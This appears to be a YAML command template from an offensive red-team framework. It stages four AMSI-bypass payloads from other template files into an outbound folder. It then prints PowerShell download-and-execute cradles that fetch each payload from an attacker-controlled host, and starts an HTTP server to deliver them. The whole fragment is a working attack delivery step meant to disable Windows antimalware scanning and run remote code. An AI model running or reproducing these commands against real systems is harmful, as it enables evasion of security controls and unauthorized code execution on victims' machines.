content: |
  mkdir -p packstation/outbound; \
  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-fieldoffset.yaml > packstation/outbound/offer1.txt; \
  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-fieldoffset-2.yaml > packstation/outbound/offer2.txt; \
  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-forceerror.yaml > packstation/outbound/offer3.txt; \
  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-mattgref02.yaml > packstation/outbound/offer4.txt; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' 'offer1.txt (FieldOffset):   IEX(New-Object Net.WebClient).DownloadString("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/offer1.txt")'; \
  printf '%s\n' 'offer2.txt (FieldOffset 2): IEX(New-Object Net.WebClient).DownloadString("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/offer2.txt")'; \
  printf '%s\n' 'offer3.txt (ForceError):    IEX(New-Object Net.WebClient).DownloadString("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/offer3.txt")'; \
  printf '%s\n' 'offer4.txt (MattGref02):    IEX(New-Object Net.WebClient).DownloadString("http://{{ attacker_ip }}:{{ delivery_outbound_port }}/offer4.txt")'; \
  printf '%s\n' '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
